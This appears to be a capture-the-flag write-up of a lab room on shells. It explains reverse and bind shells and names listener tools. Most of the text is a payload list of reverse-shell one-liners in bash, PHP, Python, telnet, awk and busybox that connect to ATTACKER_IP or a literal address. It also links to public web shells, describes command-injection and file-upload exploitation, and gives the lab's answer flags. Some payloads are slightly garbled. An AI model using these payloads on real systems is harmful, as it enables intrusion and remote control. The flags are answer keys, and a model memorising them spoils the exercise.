# Shell
## Task 3: Reverse Shell
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. 
The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

1. Set up a Netcat(nc) listener
  ```attacker@kali:~$ nc -lvnp 443```
2. Gaining Reverse Shell Access
Example of payload: ```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f```

<img width="1581" height="362" alt="image" src="https://github.com/user-attachments/assets/c02c28d0-2ddc-402e-a362-64177ecc04b8" />

4. Attacker Receives the Shell

## Task 4: Bind Shell

1. Setting Up the Bind Shell on the Target

Payload: ```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f```

<img width="1566" height="388" alt="image" src="https://github.com/user-attachments/assets/a75efebe-20eb-4111-bc3d-8d359f1629fa" />

2. Attacker Connects to the Bind Shell

```nc -nv TARGET_IP 8080```

## Task 5: Shell listeners
Let's explore some tools that can be used as listeners to interact with an incoming shell.
1. Rlwrap: It is a small utility that uses the GNU readline library to provide editing keyboard and history.
2. Ncat: Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
3. Socat: It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

## Task 6: Shell Payloads
### Bash
- Normal Bash Reverse Shell:
```bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 ```
- Bash Read Line Reverse Shell
```exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done```
- Bash With File Descriptor 5 Reverse Shell
```bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5```

### PHP
- Using exec or shell_exec
  
```php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' ```

```php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'```

- Using system function

```php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' ```

- Using popen Function

```php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' ```

### Python
- Exporting Environment Variables

```export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'```

- Using the subprocess Module

```PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' ```

- Short Reverse shell

```PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'```

### Others
- Telnet

```TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF```

- AWK
  
```awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null```

- Busybox

```busybox nc ATTACKER_IP 443 -e sh```

## Task 7: Web Shell

Existing Web Shells Available Online
1. https://github.com/flozz/p0wny-shell
2. https://github.com/b374k/b374k
3. https://www.r57shell.net/single.php?id=13


## Task 8: Practical Task

Question: 
- Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?

First, use netcat to open a listener. Then, use the payload ```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f``` to gain a shell.

<img width="440" height="553" alt="image" src="https://github.com/user-attachments/assets/b2977fdb-a827-4dac-b393-d8d8225328fb" />


***FLAG***: ```THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}```

- Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?

Upload a simple webshell on the server, then execute by URL ```/uploads/shell.php?cmd=<command_here>```

***FLAG***: ```THM{202bb14ed12120b31300cfbbbdd35998786b44e5}```
